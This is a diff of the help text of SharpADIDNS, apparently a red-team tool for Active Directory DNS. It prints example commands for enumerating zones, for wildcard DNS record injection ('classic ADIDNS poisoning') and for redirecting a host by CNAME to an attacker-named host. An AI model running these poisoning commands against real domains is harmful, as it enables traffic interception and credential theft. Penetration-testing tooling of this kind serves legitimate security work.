@@ -1227,16 +1227,16 @@ namespace SharpADIDNS
         {
             Console.WriteLine("EXAMPLES");
             Console.WriteLine("  # Recon: enumerate every dnsNode in the zone");
-            Console.WriteLine("  SharpADIDNS.exe enum --zone redteamnotes.local --domain-dn DC=redteamnotes,DC=local --server dc01.redteamnotes.local");
+            Console.WriteLine("  SharpADIDNS.exe enum --zone redteamnotes.local --domain-dn DC=redteamnotes,DC=local --server dc.redteamnotes.local");
             Console.WriteLine();
             Console.WriteLine("  # Read one record");
-            Console.WriteLine("  SharpADIDNS.exe query --zone redteamnotes.local --name fileserver --domain-dn DC=redteamnotes,DC=local");
+            Console.WriteLine("  SharpADIDNS.exe query --zone redteamnotes.local --name sccm --domain-dn DC=redteamnotes,DC=local");
             Console.WriteLine();
             Console.WriteLine("  # Wildcard A injection (classic ADIDNS poisoning)");
             Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name \"*\" --type A --data 10.0.0.66 --domain-dn DC=redteamnotes,DC=local --ttl 600");
             Console.WriteLine();
             Console.WriteLine("  # AAAA record with explicit creds over LDAPS");
-            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name web --type AAAA --data fe80::1 --domain-dn DC=redteamnotes,DC=local --server dc01.redteamnotes.local --username redteamnotes\\alice --password 'P@ss' --ldaps");
+            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name web --type AAAA --data fe80::1 --domain-dn DC=redteamnotes,DC=local --server dc.redteamnotes.local --username redteamnotes\\alice --password 'P@ss' --ldaps");
             Console.WriteLine();
             Console.WriteLine("  # CNAME redirect (preserves any AAAA on the same node)");
             Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name printer --type CNAME --data attacker.redteamnotes.local --domain-dn DC=redteamnotes,DC=local --force");
